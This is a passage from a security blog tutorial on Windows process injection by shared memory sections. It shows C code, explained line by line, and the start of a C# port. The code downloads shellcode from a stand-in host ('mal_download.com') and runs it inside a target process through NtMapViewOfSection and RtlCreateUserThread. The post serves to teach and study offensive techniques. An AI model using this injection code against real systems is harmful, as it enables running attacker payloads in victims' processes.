class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">( <span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[] )</span>
107 </span>{                                
<span class="hljs-number">108</span>     SIZE_T size = <span class="hljs-number">4096</span>;         
<span class="hljs-number">109</span>     LARGE_INTEGER sectionSize = { size };
<span class="hljs-number">110</span>     HANDLE sectionHandle = <span class="hljs-literal">NULL</span>;
<span class="hljs-number">111</span>     PVOID localSectionAddress = <span class="hljs-literal">NULL</span>;
<span class="hljs-number">112</span>     PVOID remoteSectionAddress = <span class="hljs-literal">NULL</span>;
<span class="hljs-number">113</span>     DWORD targetPID = <span class="hljs-number">0</span>;
<span class="hljs-number">114</span>     <span class="hljs-type">int</span> max = <span class="hljs-number">0x2000</span>;
<span class="hljs-number">115</span> 
<span class="hljs-number">116</span>     <span class="hljs-keyword">if</span>( argc != <span class="hljs-number">2</span> )
<span class="hljs-number">117</span>     {
<span class="hljs-number">118</span>         <span class="hljs-built_in">printf</span>(<span class="hljs-string">"USAGE: %s &lt;target PID&gt;\n"</span>, argv[<span class="hljs-number">0</span>] );
<span class="hljs-number">119</span>         <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;
<span class="hljs-number">120</span>     }
<span class="hljs-number">121</span>     
<span class="hljs-number">122</span>     <span class="hljs-type">char</span>* buf = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">NULL</span>, max, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
<span class="hljs-number">123</span>     <span class="hljs-type">int</span> buf_sz = <span class="hljs-built_in">getShellCode</span>(<span class="hljs-string">"http://mal_download.com/spawn_calc.x64.sc"</span>, buf);  
<span class="hljs-number">124</span>     targetPID = <span class="hljs-built_in">atoi</span>( argv[<span class="hljs-number">1</span>] );
<span class="hljs-number">125</span> 
<span class="hljs-number">126</span>     <span class="hljs-comment">// create a memory section</span>
<span class="hljs-number">127</span>     <span class="hljs-built_in">NtCreateSection</span>(§ionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE,
<span class="hljs-number">128</span>             <span class="hljs-literal">NULL</span>, (PLARGE_INTEGER)§ionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, <span class="hljs-literal">NULL</span>);
<span class="hljs-number">129</span>
<span class="hljs-number">130</span>     <span class="hljs-comment">// create a view of the memory section in the local process</span>
<span class="hljs-number">131</span>     <span class="hljs-built_in">NtMapViewOfSection</span>(sectionHandle, <span class="hljs-built_in">GetCurrentProcess</span>(), &amp;localSectionAddress, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>,
<span class="hljs-number">132</span>             <span class="hljs-literal">NULL</span>, &amp;size, <span class="hljs-number">2</span>, <span class="hljs-literal">NULL</span>, PAGE_READWRITE);
<span class="hljs-number">133</span>     <span class="hljs-built_in">printf</span>(<span class="hljs-string">"localSectionAddress (%p)\n"</span>, localSectionAddress);
<span class="hljs-number">134</span>
<span class="hljs-number">135</span>     <span class="hljs-comment">// create a view of the memory section in the target process</span>
<span class="hljs-number">136</span>     HANDLE targetHandle = <span class="hljs-built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, targetPID);
<span class="hljs-number">137</span>     <span class="hljs-built_in">NtMapViewOfSection</span>(sectionHandle, targetHandle, &amp;remoteSectionAddress, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>,
<span class="hljs-number">138</span>             &amp;size, <span class="hljs-number">2</span>, <span class="hljs-literal">NULL</span>, PAGE_EXECUTE_READWRITE);
<span class="hljs-number">139</span>     <span class="hljs-built_in">printf</span>(<span class="hljs-string">"remoteSectionAddress (%p)\n"</span>, remoteSectionAddress);</code></pre><p>Lines 106: Is the main function declaration</p><p class="MsoNormal">Lines 108 - 114: Set up the local variables</p><p class="MsoNormal">Lines 116 - 120: Check the program parameters to ensure the use entered a process ID of the target process to inject into</p><p class="MsoNormal">Lines 122 - 124: Allocate a local buffer and populate it with the shellcode retrieved from a remote server</p><p class="MsoNormal">Lines 126 - 128: Create a section of memory that is shareable between processes and has read, write, and execute permissions. The call to the NtCreateSection returns a Pointer to the section.</p><pre><code data-highlighted="yes" class="hljs language-css">__kernel_entry NTSYSCALLAPI NTSTATUS NtCreateSection( 
    <span class="hljs-selector-attr">[out]</span> PHANDLE SectionHandle, 
    <span class="hljs-selector-attr">[in]</span> ACCESS_MASK DesiredAccess, 
    <span class="hljs-selector-attr">[in, optional]</span> POBJECT_ATTRIBUTES ObjectAttributes, 
    <span class="hljs-selector-attr">[in, optional]</span> PLARGE_INTEGER MaximumSize, 
    <span class="hljs-selector-attr">[in]</span> ULONG SectionPageProtection, 
    <span class="hljs-selector-attr">[in]</span> ULONG AllocationAttributes, 
    <span class="hljs-selector-attr">[in, optional]</span> HANDLE FileHandle );</code></pre><p><span>Lines 130 - 133: Creates a view into the shared memory using the API NtMapViewOfSection for the local process</span></p><p class="MsoNormal"><span>The view is the only part of the Mapped Section that is visible to the program. The program will allocate a memory region for the shared memory independently of each other. As seen in Figure 2, the two (2) programs have the same data in two (2) different address spaces. Each process can also have multiple views to the same or different shared memory.</span></p><pre><code data-highlighted="yes" class="hljs language-css">NTSYSAPI NTSTATUS ZwMapViewOfSection( 
    <span class="hljs-selector-attr">[in]</span> HANDLE SectionHandle, 
    <span class="hljs-selector-attr">[in]</span> HANDLE ProcessHandle, 
    <span class="hljs-selector-attr">[in, out]</span> PVOID *BaseAddress, 
    <span class="hljs-selector-attr">[in]</span> ULONG_PTR ZeroBits, 
    <span class="hljs-selector-attr">[in]</span> SIZE_T CommitSize, 
    <span class="hljs-selector-attr">[in, out, optional]</span> PLARGE_INTEGER SectionOffset, 
    <span class="hljs-selector-attr">[in, out]</span> PSIZE_T ViewSize, 
    <span class="hljs-selector-attr">[in]</span> SECTION_INHERIT InheritDisposition, 
    <span class="hljs-selector-attr">[in]</span> ULONG AllocationType, 
    <span class="hljs-selector-attr">[in]</span> ULONG Win32Protect );</code></pre><p><span>Lines 135 - 136: Using the supplied Process ID to open a handle to the target process</span></p><p class="MsoNormal"><span>Lines 137 - 139: Creates a view into the shared memory using the API NtMapViewOfSection for the remote process</span></p><p class="MsoNormal"><span>The value supplied to the Win32Protect parameter of this second call to NtMapViewOfSection must contain the write bit, the PAGE_EXECUTE_READWRITE, for shellcode generated using msfvenom, which obfuscates its payloads using an XOR routine that overwrites its own memory. If the write option is not provided, then the code will crash.</span></p><div class="my-p56 flex justify-center text-center"><figure class="inline-block"><picture class=" inline-block"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig2_Nusbaum.png?w=1280&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469434&amp;s=f4d213b273069299ea383da911341809, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig2_Nusbaum.png?w=936&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469434&amp;s=7752d80bbd406ce40ca316ea47a27b50 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig2_Nusbaum.png?w=1280&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469434&amp;s=4093428a7e1a417a6c509ab952240922, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig2_Nusbaum.png?w=936&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469434&amp;s=eb8591d5a88e02c70b0192ec15a8a292 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig2_Nusbaum.png?w=1024&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469434&amp;s=ed4fa9798be093ec669c5f21ba8cfefd, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig2_Nusbaum.png?w=936&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469434&amp;s=7752d80bbd406ce40ca316ea47a27b50 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig2_Nusbaum.png?w=1024&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469434&amp;s=80c8554e36a9e05b7afb1ef76cbe1783, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig2_Nusbaum.png?w=936&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469434&amp;s=eb8591d5a88e02c70b0192ec15a8a292 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig2_Nusbaum.png?w=720&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469434&amp;s=dd485003b677744f1b4eb2a9579ed32b, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig2_Nusbaum.png?w=936&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469434&amp;s=7752d80bbd406ce40ca316ea47a27b50 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig2_Nusbaum.png?w=720&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469434&amp;s=f4025cb0d7fe92212f4c6c975330ec73, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig2_Nusbaum.png?w=936&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469434&amp;s=eb8591d5a88e02c70b0192ec15a8a292 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig2_Nusbaum.png?w=320&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469434&amp;s=a7383b10a8c7fe615d905b29a71f7f6f, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig2_Nusbaum.png?w=480&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469434&amp;s=a5ccb1a3ee4e44357b63dbcbb506965c 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig2_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469434&amp;s=6a2a473212f84ecacc0de44945442bc1, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig2_Nusbaum.png?w=480&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469434&amp;s=95c22ee9338aad9b55f2ac19f06a3032 1.5x"><img class="c-img opacity-0 transition-all duration-300" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig2_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469434&amp;s=6a2a473212f84ecacc0de44945442bc1" loading="lazy" x-data="image({mq1024:{width:624,height:212},mq768:{width:624,height:212},mq320:{width:624,height:212},DEFAULT:{width:320,height:109}})" :width="getSize()" :height="getSize('height')" alt="" width="624" height="212" style="opacity: 1;"></picture><figcaption class="c-caption font-mono text-xs">Figure 2 – View of the Mapped Section in both Processes</figcaption></figure></div><pre><code data-highlighted="yes" class="hljs language-scss"><span class="hljs-number">140</span> 
<span class="hljs-number">141</span>     <span class="hljs-comment">// copy shellcode to the local view, which will get reflected in the target process's mapped view</span>
<span class="hljs-number">142</span>     <span class="hljs-built_in">memcpy</span>(localSectionAddress, buf, size);</code></pre><p><span>Line 142: Copies the downloaded shellcode into the view in the local process</span></p><p class="MsoNormal"><span>This eliminates the need to try and write to a remote process. As shown in Figure 3, the changes to one (1) view are mirrored across all views.</span></p><div class="my-p56 flex justify-center text-center"><figure class="inline-block"><picture class=" inline-block"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig3_Nusbaum.png?w=1280&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469435&amp;s=ecae2e69c2be6e2b65d3710a6ebfec94, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig3_Nusbaum.png?w=936&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469435&amp;s=7d9712f4e827362d1a0d31ad3c2fe6cb 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig3_Nusbaum.png?w=1280&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469435&amp;s=501bda3111a5a1b31b1f940ab81bd421, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig3_Nusbaum.png?w=936&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469435&amp;s=2492cbf9302467f2bb811b45025ad5d8 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig3_Nusbaum.png?w=1024&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469435&amp;s=0969d3d57dacb5efa1cbc419d63c5b04, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig3_Nusbaum.png?w=936&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469435&amp;s=7d9712f4e827362d1a0d31ad3c2fe6cb 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig3_Nusbaum.png?w=1024&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469435&amp;s=f63c84492bf78577dcedaa3101a660c5, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig3_Nusbaum.png?w=936&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469435&amp;s=2492cbf9302467f2bb811b45025ad5d8 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig3_Nusbaum.png?w=720&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469435&amp;s=094204b66961a3e174ea276c79de35bb, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig3_Nusbaum.png?w=936&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469435&amp;s=7d9712f4e827362d1a0d31ad3c2fe6cb 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig3_Nusbaum.png?w=720&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469435&amp;s=3f2dd439e2466b526f8f492c68a27ec8, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig3_Nusbaum.png?w=936&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469435&amp;s=2492cbf9302467f2bb811b45025ad5d8 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig3_Nusbaum.png?w=320&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469435&amp;s=15d50b17a827509d46ce8e7b7aa5f447, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig3_Nusbaum.png?w=480&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469435&amp;s=6beeb0f28e658fcb3f4fe22f5cc88726 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig3_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469435&amp;s=3f61f1193aed0d45182d5004865411b8, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig3_Nusbaum.png?w=480&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469435&amp;s=acb4a6d09700e317a8a905321029ec0d 1.5x"><img class="c-img opacity-0 transition-all duration-300" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig3_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469435&amp;s=3f61f1193aed0d45182d5004865411b8" loading="lazy" x-data="image({mq1024:{width:624,height:212},mq768:{width:624,height:212},mq320:{width:624,height:212},DEFAULT:{width:320,height:109}})" :width="getSize()" :height="getSize('height')" alt="" width="624" height="212" style="opacity: 1;"></picture><figcaption class="c-caption font-mono text-xs">Figure 3 – After the Shellcode was Copied into the Local Mapped Memory</figcaption></figure></div><pre><code data-highlighted="yes" class="hljs language-objectivec"><span class="hljs-number">143</span> 
<span class="hljs-number">144</span>     HANDLE targetThreadHandle = <span class="hljs-literal">NULL</span>;
<span class="hljs-number">145</span>     RtlCreateUserThread(targetHandle, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">FALSE</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, remoteSectionAddress, <span class="hljs-literal">NULL</span>,
<span class="hljs-number">146</span>             &amp;targetThreadHandle, <span class="hljs-literal">NULL</span>);
<span class="hljs-number">147</span>
<span class="hljs-number">148</span>     VirtualFree( buf, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span> );
<span class="hljs-number">149</span>     <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
<span class="hljs-number">150</span> }</code></pre><p><span>Lines 144 - 146: Creates a thread in the remote process and provides the memory address of the view as the execution point</span></p><p class="MsoNormal"><span>This will cause the remote program to execute the shellcode.</span></p><div class="my-p56 flex justify-center text-center"><figure class="inline-block"><picture class=" inline-block"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig4_Nusbaum.png?w=1280&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469436&amp;s=974118a0de609adb5dc41cd4a0592f9d, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig4_Nusbaum.png?w=936&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469436&amp;s=9fef2e34918991b0bfb700684ad04447 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig4_Nusbaum.png?w=1280&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469436&amp;s=9cb585ca1ee0bc6ffe1ee0e00f80fe93, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig4_Nusbaum.png?w=936&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469436&amp;s=b44d02edee724ff99fe14e8f2864966d 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig4_Nusbaum.png?w=1024&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469436&amp;s=6824864c4b3ea7c8cff476036466d15c, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig4_Nusbaum.png?w=936&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469436&amp;s=9fef2e34918991b0bfb700684ad04447 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig4_Nusbaum.png?w=1024&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469436&amp;s=81af6d09e2241a6857c300625511814f, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig4_Nusbaum.png?w=936&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469436&amp;s=b44d02edee724ff99fe14e8f2864966d 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig4_Nusbaum.png?w=720&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469436&amp;s=c9b931eb3fb01fa38e62157c53cab408, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig4_Nusbaum.png?w=936&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469436&amp;s=9fef2e34918991b0bfb700684ad04447 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig4_Nusbaum.png?w=720&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469436&amp;s=54a17051b823ff338bbc4032f1ac26d5, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig4_Nusbaum.png?w=936&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469436&amp;s=b44d02edee724ff99fe14e8f2864966d 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig4_Nusbaum.png?w=320&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469436&amp;s=6dfddaf68bdae4813eb06f92d0b48985, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig4_Nusbaum.png?w=480&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1734469436&amp;s=96bae8596e9d9e4d37ef8833f6b20d39 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig4_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469436&amp;s=785bd588ba10b9f917b05713e8f82b2c, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig4_Nusbaum.png?w=480&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469436&amp;s=c2027e3baa25cf4ce365fd59179876bf 1.5x"><img class="c-img opacity-0 transition-all duration-300" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/ProcessInjection_Nusbaum/Fig4_Nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1734469436&amp;s=785bd588ba10b9f917b05713e8f82b2c" loading="lazy" x-data="image({mq1024:{width:624,height:212},mq768:{width:624,height:212},mq320:{width:624,height:212},DEFAULT:{width:320,height:109}})" :width="getSize()" :height="getSize('height')" alt="" width="624" height="212" style="opacity: 1;"></picture><figcaption class="c-caption font-mono text-xs">Figure 4 – Final Execute of Shellcode Spawns Calculator</figcaption></figure></div><p><span>The next code excerpt is in C# and performs the same actions as the C code above. We are not going to walk through the C# code line by line this time—it’s almost a direct port of the C code. The C# code is wrapped in an unsafe tag, which allows us to use memory unsafe direct pointers. The main difference between the two (2) code samples is that we needed to define each of the API calls.</span></p><p class="MsoNormal"><span>The following code is divided into groups to match those from the C section, with the exception of the first part, which is the defined API calls, and declares variables to make reading easier. The following definitions are obtained through pinvoke.net.</span></p><pre><code data-highlighted="yes" class="hljs language-java"><span class="hljs-number">10</span>     unsafe <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Blah</span>                                                       
<span class="hljs-number">11</span>     {                                                                              
<span class="hljs-number">12</span>         [DllImport(<span class="hljs-string">"ntdll.dll"</span>, SetLastError = <span class="hljs-literal">true</span>, ExactSpelling = <span class="hljs-literal">true</span>)]        
<span class="hljs-number">13</span>         <span class="hljs-keyword">static</span> extern UInt32 <span class="hljs-title function_">NtCreateSection</span><span class="hljs-params">(ref IntPtr SectionHandle, UInt32 DesiredAccess, IntPtr ObjectAttributes, ref UInt32 MaximumSize, UInt32 SectionPageProtection  
<span class="hljs-number">14</span>                                                                                    
<span class="hljs-number">15</span>         [DllImport(<span class="hljs-string">"ntdll.dll"</span>, SetLastError = <span class="hljs-literal">true</span>)</span>]                              
<span class="hljs-number">16</span>         <span class="hljs-keyword">static</span> extern uint <span class="hljs-title function_">NtMapViewOfSection</span><span class="hljs-params">(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, IntPtr CommitSize, out ulong SectionOff  
<span class="hljs-number">17</span>                                                                                    
<span class="hljs-number">18</span>         [DllImport(<span class="hljs-string">"kernel32.dll"</span>, SetLastError = <span class="hljs-literal">true</span>)</span>]                           
<span class="hljs-number">19</span>         <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> extern IntPtr <span class="hljs-title function_">OpenProcess</span><span class="hljs-params">(uint processAccess, bool bInheritHandle, <span class="hljs-type">int</span> processId)</span>;  
<span class="hljs-number">20</span>                                                                                    
<span class="hljs-number">21</span>         [DllImport(<span class="hljs-string">"ntdll.dll"</span>, SetLastError=<span class="hljs-literal">true</span>)]                                
<span class="hljs-number">22</span>         <span class="hljs-keyword">static</span> extern IntPtr <span class="hljs-title function_">RtlCreateUserThread</span><span class="hljs-params">(IntPtr processHandle, IntPtr threadSecurity, bool createSuspended, Int32 stackZeroBits, IntPtr stackReserved, IntPtr stac  
<span class="hljs-number">23</span>                                                                                    
<span class="hljs-number">24</span>         [DllImport(<span class="hljs-string">"msvcrt.dll"</span>, EntryPoint = <span class="hljs-string">"memcpy"</span>, CallingConvention = CallingConvention.Cdecl, SetLastError = <span class="hljs-literal">false</span>)</span>]  
<span class="hljs-number">25</span>         <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> extern IntPtr <span class="hljs-title function_">memcpy</span><span class="hljs-params">(IntPtr dest, IntPtr src, uint count)</span>;  
<span class="hljs-number">26</span>                                                                                    
<span class="hljs-number">27</span>         <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">uint</span> <span class="hljs-variable">SECTION_MAP_WRITE</span> <span class="hljs-operator">=</span> <span class="hljs-number">0x0002</span>;                            
<span class="hljs-number">28</span>         <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">uint</span> <span class="hljs-variable">SECTION_MAP_READ</span> <span class="hljs-operator">=</span> <span class="hljs-number">0x0004</span>;                             
<span class="hljs-number">29</span>         <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">uint</span> <span class="hljs-variable">SECTION_MAP_EXECUTE</span> <span class="hljs-operator">=</span> <span class="hljs-number">0x0008</span>;                          
<span class="hljs-number">30</span>                                                                                    
<span class="hljs-number">31</span>                                                                                    
<span class="hljs-number">32</span>         <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">uint</span> <span class="hljs-variable">PAGE_READWRITE</span> <span class="hljs-operator">=</span> <span class="hljs-number">0x04</span>;                                 
<span class="hljs-number">33</span> <span class="hljs-comment">//        private static uint PAGE_EXECUTE_READ = 0x20;                            </span>
<span class="hljs-number">34</span>         <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">uint</span> <span class="hljs-variable">PAGE_EXECUTE_READWRITE</span> <span class="hljs-operator">=</span> <span class="hljs-number">0x40</span>;                         
<span class="hljs-number">35</span>         <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">uint</span> <span class="hljs-variable">SEC_COMMIT</span> <span class="hljs-operator">=</span> <span class="hljs-number">0x8000000</span>;                                
<span class="hljs-number">36</span>                                                                                    
<span class="hljs-number">37</span>         <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">uint</span> <span class="hljs-variable">PROCESS_ALL_ACCESS</span> <span class="hljs-operator">=</span> <span class="hljs-number">0x1fffff</span>;</code></pre><p><span>The following section declares the local variables and obtains the shellcode from a remote server.</span></p><pre><code data-highlighted="yes" class="hljs language-csharp"><span class="hljs-number">51</span>         <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Main</span>(<span class="hljs-params"><span class="hljs-built_in">string</span>[] args</span>)                                     
52</span>         {                                                                          
<span class="hljs-number">53</span>             <span class="hljs-built_in">byte</span>[] buf = <span class="hljs-keyword">new</span> <span class="hljs-built_in">byte</span>[<span class="hljs-number">10</span>];                                             
<span class="hljs-number">54</span>             IntPtr sectionHandle = IntPtr.Zero;                                    
<span class="hljs-number">55</span>             <span class="hljs-built_in">int</span> size = <span class="hljs-number">4096</span>;                                                       
<span class="hljs-number">56</span>             <span class="hljs-built_in">ulong</span> tmp = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ulong</span>();                                               
<span class="hljs-number">57</span>             UInt32 sectionSize = (<span class="hljs-built_in">uint</span>)size;                                       
<span class="hljs-number">58</span>             IntPtr localSectionAddress = IntPtr.Zero;                              
<span class="hljs-number">59</span>             IntPtr remoteSectionAddress = IntPtr.Zero;                             
